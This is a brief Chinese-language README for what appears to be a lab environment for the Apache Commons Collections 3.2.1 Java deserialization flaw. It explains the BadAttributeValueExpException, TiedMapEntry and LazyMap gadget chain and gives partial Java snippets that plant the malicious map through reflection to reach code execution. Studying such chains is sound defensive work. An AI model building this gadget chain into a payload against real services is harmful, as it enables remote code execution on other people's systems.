# Commons-collections-
Commons-collections反序列化利用环境

# Gadget利用链
此为Gadget利用链。后续有相关问题可参考http://1aker.xyz/2019/12/25/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E4%BA%A7%E7%94%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%96%91%E9%97%AE/#more

# 此条链条需要的JAR包
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
 
# 漏洞链分析
在BadAttributeValueExpException（import javax.management.BadAttributeValueExpException;） 
发现了重写readObject--> 在其中调用了toString方法-->寻找到TiedMapEntry重写了toString方法（使用getValue，间接用的MAP.get方法）--> 利用LazyMap.decorate包装恶意代码，在使用get方法触发块代码 
即Map lazyMap = LazyMap.decorate(innerMap, transformChain); 

# 正向分析
程序执行时，会解析到BadAttributeValueExpException类，然后执行其readObject 
该类值val由我们反射修改为LazyMap.decorate包装的恶意代码：
        BadAttributeValueExpException exception = new BadAttributeValueExpException(null); 
        Field valField = exception.getClass().getDeclaredField("val"); 
        valField.setAccessible(true); 
        valField.set(exception, entry);//利用反射钩取val变量并赋值为恶意包装类。 
然后由于该值在改变，所以触发了 
        Map innerMap = new HashMap(); 
        Map lazyMap = LazyMap.decorate(innerMap, transformChain); 
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo233"); 
 其中的transformChain方法，达到代码执行 
 
